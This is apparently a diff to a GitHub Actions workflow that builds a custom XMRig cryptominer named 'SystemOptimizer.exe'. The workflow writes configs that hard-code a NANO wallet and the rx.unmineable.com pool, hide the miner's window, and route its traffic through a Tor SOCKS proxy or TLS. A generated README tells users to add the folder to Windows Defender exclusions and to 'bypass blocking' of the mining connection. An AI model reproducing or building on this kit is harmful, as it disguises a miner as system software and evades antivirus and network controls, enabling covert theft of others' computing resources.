@@ -67,94 +67,94 @@ jobs:
         Write-Host "Creating configuration files..."
         
         $configTor = @{
-            "autosave" = $true
-            "background" = $true
-            "colors" = $false
-            "title" = $false
-            "randomx" = @{
-                "init" = -1
-                "mode" = "auto"
+            autosave = $true
+            background = $true
+            colors = $false
+            title = $false
+            randomx = @{
+                init = -1
+                mode = "auto"
                 "1gb-pages" = $false
-                "numa" = $true
+                numa = $true
             }
-            "cpu" = @{
-                "enabled" = $true
+            cpu = @{
+                enabled = $true
                 "huge-pages" = $true
-                "priority" = 1
+                priority = 1
                 "max-threads-hint" = 75
-                "asm" = $true
+                asm = $true
             }
             "log-file" = "optimizer.log"
-            "pools" = @(
+            pools = @(
                 @{
-                    "url" = "rx.unmineable.com:3333"
-                    "user" = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
-                    "pass" = "x"
-                    "keepalive" = $true
-                    "tls" = $false
-                    "socks5" = "127.0.0.1:9050"
+                    url = "rx.unmineable.com:3333"
+                    user = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
+                    pass = "x"
+                    keepalive = $true
+                    tls = $false
+                    socks5 = "127.0.0.1:9050"
                 }
             )
             "print-time" = 60
-            "retries" = 5
+            retries = 5
             "retry-pause" = 5
         }
         $configTor | ConvertTo-Json -Depth 10 | Out-File "output\config-tor.json" -Encoding UTF8
         
         $configTLS = @{
-            "autosave" = $true
-            "background" = $true
-            "colors" = $false
-            "title" = $false
-            "randomx" = @{
-                "init" = -1
-                "mode" = "auto"
+            autosave = $true
+            background = $true
+            colors = $false
+            title = $false
+            randomx = @{
+                init = -1
+                mode = "auto"
                 "1gb-pages" = $false
-                "numa" = $true
+                numa = $true
             }
-            "cpu" = @{
-                "enabled" = $true
+            cpu = @{
+                enabled = $true
                 "huge-pages" = $true
-                "priority" = 1
+                priority = 1
                 "max-threads-hint" = 75
-                "asm" = $true
+                asm = $true
             }
             "log-file" = "optimizer.log"
-            "pools" = @(
+            pools = @(
                 @{
-                    "url" = "rx.unmineable.com:443"
-                    "user" = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
-                    "pass" = "x"
-                    "keepalive" = $true
-                    "tls" = $true
+                    url = "rx.unmineable.com:443"
+                    user = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
+                    pass = "x"
+                    keepalive = $true
+                    tls = $true
                 }
             )
             "print-time" = 60
-            "retries" = 5
+            retries = 5
             "retry-pause" = 5
         }
         $configTLS | ConvertTo-Json -Depth 10 | Out-File "output\config-tls.json" -Encoding UTF8
         
         $configTest = @{
-            "autosave" = $false
-            "background" = $false
-            "colors" = $true
-            "title" = $true
-            "randomx" = @{
-                "init" = -1
-                "mode" = "auto"
+            autosave = $false
+            background = $false
+            colors = $true
+            title = $true
+            randomx = @{
+                init = -1
+                mode = "auto"
             }
-            "cpu" = @{
-                "enabled" = $true
+            cpu = @{
+                enabled = $true
                 "huge-pages" = $true
                 "max-threads-hint" = 75
             }
-            "pools" = @(
+            pools = @(
                 @{
-                    "url" = "rx.unmineable.com:3333"
-                    "user" = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
-                    "pass" = "x"
-                    "keepalive" = $true
+                    url = "rx.unmineable.com:3333"
+                    user = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
+                    pass = "x"
+                    keepalive = $true
                 }
             )
             "print-time" = 60
@@ -171,90 +171,93 @@ jobs:
         
         "@echo off`r`necho Stopping SystemOptimizer...`r`ntaskkill /F /IM SystemOptimizer.exe 2>nul`r`nif errorlevel 1 (echo Not running) else (echo Stopped)`r`npause" | Out-File "output\STOP.bat" -Encoding ASCII
         
-        $readme = @"
-════════════════════════════════════════════════════════════
-    NANO MINER - CUSTOM BUILD FROM SOURCE
-════════════════════════════════════════════════════════════
-
-Wallet:   nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp
-Worker:   d3ibis_pc
-Referral: c5g6-wmzx (0.25% bonus)
-Pool:     rx.unmineable.com
-
-════════════════════════════════════════════════════════════
-STEP 1 - ADD TO WINDOWS DEFENDER EXCLUSIONS
-════════════════════════════════════════════════════════════
-
-REQUIRED! Windows will delete the file without this.
-
-1. Windows Security → Virus & threat protection
-2. Manage settings → Exclusions
-3. Add this folder
-
-════════════════════════════════════════════════════════════
-STEP 2 - TEST CONNECTION
-════════════════════════════════════════════════════════════
-
-Double-click: START-TEST.bat
-
-If you see "accepted" shares, you're mining!
-If blocked, proceed to Step 3.
-
-════════════════════════════════════════════════════════════
-STEP 3 - BYPASS BLOCKING
-════════════════════════════════════════════════════════════
-
-METHOD A - TLS (Try this first):
-  Double-click: START-TLS.bat
-
-METHOD B - Tor (Most reliable):
-  1. Download: https://www.torproject.org/download/tor/
-  2. Run tor.exe
-  3. Double-click: START-TOR.bat
-
-════════════════════════════════════════════════════════════
-FILES
-════════════════════════════════════════════════════════════
-
-SystemOptimizer.exe - Custom built miner
-config-tor.json     - With Tor proxy
-config-tls.json     - With TLS encryption
-config-test.json    - For testing
-START-TOR.bat       - Run with Tor
-START-TLS.bat       - Run with TLS
-START-TEST.bat      - Test mode
-STOP.bat            - Stop miner
-
-════════════════════════════════════════════════════════════
-MONITOR
-════════════════════════════════════════════════════════════
-
-Stats: https://unmineable.com/ (enter your wallet)
-Log:   optimizer.log (look for "accepted" messages)
-
-════════════════════════════════════════════════════════════
-TROUBLESHOOTING
-════════════════════════════════════════════════════════════
-
-Q: File deleted
-A: Add folder to Windows Defender exclusions
-
-Q: Connection refused
-A: Try START-TLS.bat, then START-TOR.bat
-
-Q: Low hashrate
-A: Run as Administrator, close other programs
-
-════════════════════════════════════════════════════════════
-
-Build: $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')
-Source: https://github.com/d3ibis/XMRig
-
-════════════════════════════════════════════════════════════
-"@
-        $readme | Out-File "output\README.txt" -Encoding UTF8
+        Write-Host "Creating README..."
         
-        Write-Host "Done! Files ready in output folder"
+        $lines = @(
+          "============================================================",
+          "    NANO MINER - CUSTOM BUILD FROM SOURCE",
+          "============================================================",
+          "",
+          "Wallet:   nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp",
+          "Worker:   d3ibis_pc",
+          "Referral: c5g6-wmzx (0.25% bonus)",
+          "Pool:     rx.unmineable.com",
+          "",
+          "============================================================",
+          "STEP 1 - ADD TO WINDOWS DEFENDER EXCLUSIONS",
+          "============================================================",
+          "",
+          "REQUIRED! Windows will delete the file without this.",
+          "",
+          "1. Windows Security > Virus & threat protection",
+          "2. Manage settings > Exclusions",
+          "3. Add this folder",
+          "",
+          "============================================================",
+          "STEP 2 - TEST CONNECTION",
+          "============================================================",
+          "",
+          "Double-click: START-TEST.bat",
+          "",
+          "If you see 'accepted' shares, you're mining!",
+          "If blocked, proceed to Step 3.",
+          "",
+          "============================================================",
+          "STEP 3 - BYPASS BLOCKING",
+          "============================================================",
+          "",
+          "METHOD A - TLS (Try this first):",
+          "  Double-click: START-TLS.bat",
+          "",
+          "METHOD B - Tor (Most reliable):",
+          "  1. Download: https://www.torproject.org/download/tor/",
+          "  2. Run tor.exe",
+          "  3. Double-click: START-TOR.bat",
+          "",
+          "============================================================",
+          "FILES",
+          "============================================================",
+          "",
+          "SystemOptimizer.exe - Custom built miner",
+          "config-tor.json     - With Tor proxy",
+          "config-tls.json     - With TLS encryption",
+          "config-test.json    - For testing",
+          "START-TOR.bat       - Run with Tor",
+          "START-TLS.bat       - Run with TLS",
+          "START-TEST.bat      - Test mode",
+          "STOP.bat            - Stop miner",
+          "",
+          "============================================================",
+          "MONITOR",
+          "============================================================",
+          "",
+          "Stats: https://unmineable.com/ (enter your wallet)",
+          "Log:   optimizer.log (look for 'accepted' messages)",
+          "",
+          "============================================================",
+          "TROUBLESHOOTING",
+          "============================================================",
+          "",
+          "Q: File deleted",
+          "A: Add folder to Windows Defender exclusions",
+          "",
+          "Q: Connection refused",
+          "A: Try START-TLS.bat, then START-TOR.bat",
+          "",
+          "Q: Low hashrate",
+          "A: Run as Administrator, close other programs",
+          "",
+          "============================================================",
+          "",
+          "Build: $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')",
+          "Source: https://github.com/d3ibis/XMRig",
+          "",
+          "============================================================"
+        )
+        
+        $lines -join "`r`n" | Out-File "output\README.txt" -Encoding UTF8
+        
+        Write-Host "Done! All files prepared successfully"
       shell: pwsh
       
     - name: Upload artifacts
